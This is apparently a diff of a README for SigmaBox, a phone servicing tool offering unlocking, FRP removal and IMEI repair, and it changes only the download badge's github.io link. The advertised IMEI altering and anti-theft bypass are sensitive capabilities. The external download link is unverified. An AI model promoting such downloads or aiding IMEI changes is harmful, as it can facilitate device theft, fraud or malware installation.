@@ -2,7 +2,7 @@
 
 SigmaBox is a hardware-based mobile servicing tool designed for professional unlocking, flashing, FRP removal, and IMEI repair on Qualcomm, HiSilicon, MediaTek, and Broadcom chipsets. Built for use in mobile repair centers, SigmaBox offers fast, secure, and versatile phone servicing with wide model support.
 
-[![Download SigmaBox](https://img.shields.io/badge/Download-SigmaBox-blueviolet)](https://sigmabox-download.github.io/.github)
+[![Download SigmaBox](https://img.shields.io/badge/Download-SigmaBox-blueviolet)](https://sigmabox-downloadtool.github.io/.github/)
 
 ---
 
